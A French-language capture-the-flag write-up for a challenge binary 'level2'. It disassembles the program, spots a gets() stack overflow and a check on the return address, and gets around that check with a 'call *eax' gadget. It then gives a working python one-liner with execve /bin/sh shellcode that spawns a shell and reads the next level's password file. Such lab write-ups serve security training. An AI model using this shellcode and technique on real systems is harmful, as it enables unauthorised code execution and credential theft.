$ gdb ./level2
(gdb) disas main
Dump of assembler code for function main:
   0x0804853f <+0>:	   push   %ebp
   0x08048540 <+1>:	   mov    %esp,%ebp
   0x08048542 <+3>:	   and    $0xfffffff0,%esp
   0x08048545 <+6>:	   call   0x80484d4 <p>
   0x0804854a <+11>:   leave
   0x0804854b <+12>:   ret
End of assembler dump.
(gdb) disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:	   push   %ebp
   0x080484d5 <+1>:	   mov    %esp,%ebp
   0x080484d7 <+3>:	   sub    $0x68,%esp
   0x080484da <+6>:	   mov    0x8049860,%eax
   0x080484df <+11>:   mov    %eax,(%esp)
   0x080484e2 <+14>:   call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:   lea    -0x4c(%ebp),%eax
   0x080484ea <+22>:   mov    %eax,(%esp)
   0x080484ed <+25>:   call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:   mov    0x4(%ebp),%eax
   0x080484f5 <+33>:   mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:   mov    -0xc(%ebp),%eax
   0x080484fb <+39>:   and    $0xb0000000,%eax
   0x08048500 <+44>:   cmp    $0xb0000000,%eax
   0x08048505 <+49>:   jne    0x8048527 <p+83>
   0x08048507 <+51>:   mov    $0x8048620,%eax
   0x0804850c <+56>:   mov    -0xc(%ebp),%edx
   0x0804850f <+59>:   mov    %edx,0x4(%esp)
   0x08048513 <+63>:   mov    %eax,(%esp)
   0x08048516 <+66>:   call   0x80483a0 <printf@plt>
   0x0804851b <+71>:   movl   $0x1,(%esp)
   0x08048522 <+78>:   call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:   lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:   mov    %eax,(%esp)
   0x0804852d <+89>:   call   0x80483f0 <puts@plt>
   0x08048532 <+94>:   lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:   mov    %eax,(%esp)
   0x08048538 <+100>:  call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:  leave
   0x0804853e <+106>:  ret
End of assembler dump.

Les lignes interessantes sont:
call gets
cmp  0xb0000000, eax
call strdup

Du coup avec gets on va pouvoir ecrire sur la stack et redefinir l'eip.
le binaire fait tout meme une verification de l'eip il verifie que l'adresse ne commence pas par 'b'.
Du coup impossible de redefinir l'eip sur l'argument de gets qui a une adresse egala a 0xbf...
Par contre on voit un strdup a la fin et on sait qu'eax contient toujours le retour des appels de fonctions.
Du coup y a t il quelque part dans le code un appel a eax ???
$ objdump -d ./level2 | grep -B 1 call
 8048359: 83 ec 08             	sub    $0x8,%esp
 804835c: e8 00 00 00 00       	call   8048361 <_init+0x9>
--
 8048370:	74 05					je     8048377 <_init+0x1f>
 8048372:	e8 89 00 00 00       	call   8048400 <__gmon_start__@plt>
 8048377:	e8 34 01 00 00       	call   80484b0 <frame_dummy>
 804837c:	e8 4f 02 00 00       	call   80485d0 <__do_global_ctors_aux>
--
 8048437:	68 3f 85 04 08			push   $0x804853f
 804843c:	e8 cf ff ff ff       	call   8048410 <__libc_start_main@plt>
--
 8048483:	a3 68 98 04 08			mov    %eax,0x8049868
 8048488:	ff 14 85 50 97 04 08 	call   *0x8049750(,%eax,4)
--
 80484c8:	c7 04 24 58 97 04 08	movl   $0x8049758,(%esp)
 80484cf:	ff d0                	call   *%eax
--
 80484df:	89 04 24				mov    %eax,(%esp)
 80484e2:	e8 c9 fe ff ff       	call   80483b0 <fflush@plt>
--
 80484ea:	89 04 24				mov    %eax,(%esp)
 80484ed:	e8 ce fe ff ff       	call   80483c0 <gets@plt>
--
 8048513:	89 04 24				mov    %eax,(%esp)
 8048516:	e8 85 fe ff ff       	call   80483a0 <printf@plt>
 804851b:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 8048522:	e8 a9 fe ff ff       	call   80483d0 <_exit@plt>
--
 804852a:	89 04 24				mov    %eax,(%esp)
 804852d:	e8 be fe ff ff       	call   80483f0 <puts@plt>
--
 8048535:	89 04 24				mov    %eax,(%esp)
 8048538:	e8 a3 fe ff ff       	call   80483e0 <strdup@plt>
--
 8048542:	83 e4 f0				and    $0xfffffff0,%esp
 8048545:	e8 8a ff ff ff       	call   80484d4 <p>
--
 8048553:	53						push   %ebx
 8048554:	e8 69 00 00 00       	call   80485c2 <__i686.get_pc_thunk.bx>
--
 8048566:	8d bb 20 ff ff ff		lea    -0xe0(%ebx),%edi
 804856c:	e8 e7 fd ff ff       	call   8048358 <_init>
--
 8048597:	89 44 24 04				mov    %eax,0x4(%esp)
 804859b:	ff 94 b3 20 ff ff ff 	call   *-0xe0(%ebx,%esi,4)
--
 80485e8:	83 eb 04				sub    $0x4,%ebx
 80485eb:	ff d0                	call   *%eax
--
 80485fd:	83 ec 08				sub    $0x8,%esp
 8048600:	e8 00 00 00 00       	call   8048605 <_fini+0x9>
--
 8048606:	81 c3 23 12 00 00		add    $0x1223,%ebx
 804860c:	e8 3f fe ff ff       	call   8048450 <__do_global_dtors_aux>

BIngo : 80484cf et 80485eb font precisement call *eax.
Du coup en ecrivant notre shellcode dans le buffer (passer a gets) MAIS 
en faisant attention a ne pas depasser 0x4c - 0xc = 64 caracteres on pourra lancer notre shellcode grace a strdup et call *eax.

On test avec un shellcode de 25 caracters et on bourre le reste avec ladresse de call *eax (0x080485eb):

$ python -c 'print "\x90"*39+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x08\x04\x85\xeb"[::-1]*6' > /tmp/toto
$ cat /tmp/toto - | ./level2
���������������������������������������1�Ph//shh/bin��P��S��
                                                             ̀�
ls
ls: cannot open directory .: Permission denied
cat /home/user/level3/.pass
********************************************

done !
